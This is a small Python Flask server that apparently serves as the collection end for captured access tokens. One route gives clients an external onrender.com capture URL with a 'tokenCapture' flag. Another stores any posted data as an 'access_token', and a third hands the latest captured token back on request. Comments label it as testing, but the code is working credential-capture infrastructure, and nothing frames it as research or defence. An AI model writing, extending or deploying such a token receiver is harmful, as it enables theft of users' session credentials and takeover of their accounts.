from flask import Flask, request, jsonify, render_template
import json
import time

app = Flask(__name__)
tokens = {}

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/api/config', methods=['GET'])
def config():
    return jsonify({
        "verAddr": "https://accessstoken-i0dx.onrender.com/api/capture",
        "tokenCapture": True,
        "version": "1.0.0"
    })

@app.route('/api/capture', methods=['POST'])
def capture():
    global tokens
    raw = request.get_data()
    print(f"[*] Received {len(raw)} bytes")
    
    # Store raw data as hex for testing
    tokens['latest'] = {
        'access_token': raw.hex()[:64] if raw else "NO_DATA",
        'open_id': "TEST_123",
        'timestamp': time.time()
    }
    
    return "OK", 200, {'Content-Type': 'text/plain'}

@app.route('/api/get-token', methods=['GET'])
def get_token():
    data = tokens.get('latest')
    if data:
        return jsonify(data)
    return jsonify({"error": "No token captured yet"}), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
